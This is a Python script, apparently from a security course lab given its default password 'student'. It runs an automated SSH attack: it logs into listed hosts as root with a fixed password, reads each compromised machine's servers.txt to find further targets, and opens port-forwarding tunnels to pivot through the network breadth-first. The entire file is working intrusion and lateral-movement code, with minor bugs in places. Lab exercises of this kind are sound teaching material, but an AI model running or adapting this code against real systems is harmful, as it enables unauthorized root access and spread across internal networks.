import paramiko
import os
import socket
import select
import Queue
try:
    import SocketServer
except ImportError:
    import socketServer as SocketServer

import sys
import threading

g_verbose = True

DEFAULT_PASS = "student"
ROOT = "root"
q = Queue.Queue()
ip_list = []
FORWARD_PORT = 9050

class Computer:
    def __init__(self, ip, ssh_port):
        # ip address of the machine
        self.host = ip
        # port where SSH server is listening
        self.ssh_port = ssh_port
        # initialize as empty dict
        # keys = accountName
        # values = password
        self.accounts = {}
        self.local_forward = ""

    def __str__(self):
        print (self.ip, self.ssh_port, self.accounts)

class ForwardServer (SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True
    

class Handler (SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel('direct-tcpip',
                                                   (self.chain_host, self.chain_port),
                                                   self.request.getpeername())
        except Exception as e:
            verbose('Incoming request to %s:%d failed: %s' % (self.chain_host,
                                                              self.chain_port,
                                                              repr(e)))
            return
        if chan is None:
            verbose('Incoming request to %s:%d was rejected by the SSH server.' %
                    (self.chain_host, self.chain_port))
            return

        verbose('Connected!  Tunnel open %r -> %r -> %r' % (self.request.getpeername(),
                                                            chan.getpeername(), (self.chain_host, self.chain_port)))
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)
                
        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        verbose('Tunnel closed from %r' % (peername,))


def forward_tunnel(local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander (Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport
    threading.Thread(target=ForwardServer(('', local_port), SubHander).serve_forever).start()

def verbose(s):
    if g_verbose:
        print(s)

def get_host_port(data):
    args = data.split(":")
    args[1] = int(args[1])
    return args

def begin_attack(client, host):
    print "Beginning attack"

    # executes BFS over network
    while not q.empty():
        # gets the next computer in BFS
        server = q.get()
        verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
        try:
            client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS, sock=paramiko.ProxyCommand(host.get("proxycommand")))
        except Exception as e:
            print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
            q.put(server)
            continue

        # at this point we are connected via SSH
        # gets the servers.txt
        stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
        new_servers = stdout.readlines()
        new_servers = map(lambda x: x.strip(), new_servers)
        for s in new_servers:
            host, port = get_host_port(s)
            # if we have not seen this ip_address before
            if not (host in ip_list):
                # create the compObj and add it to be seen in the queue
                compObj = Computer(host, port)
                ip_list.append(host)
                compObj.local_forward = FORWARD_PORT + threading.activeCount()
                q.put(compObj)

                # set up forwarder to the new computer
                try:
                    forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
                    verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
                except Exception as e:
                    print e




if __name__ == "__main__":
    # init paramiko
    conf = paramiko.SSHConfig()
    conf.parse(open(os.path.expanduser("/etc/ssh/ssh_config")))
    host = conf.lookup(ROOT)

    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    f = open("servers.txt", "r")
    computers = f.readlines()
    f.close()

    # initialize the queue with starting computer list
    for c in computers:
        host, port = get_host_port(c)
        compObj = Computer(host, port)
        ip_list.append(host)
        q.put(compObj)

    try:
        begin_attack(client, host)
    except KeyboardInterrupt:
        for t in threading.enumerate():
            pass
        sys.exit(1)
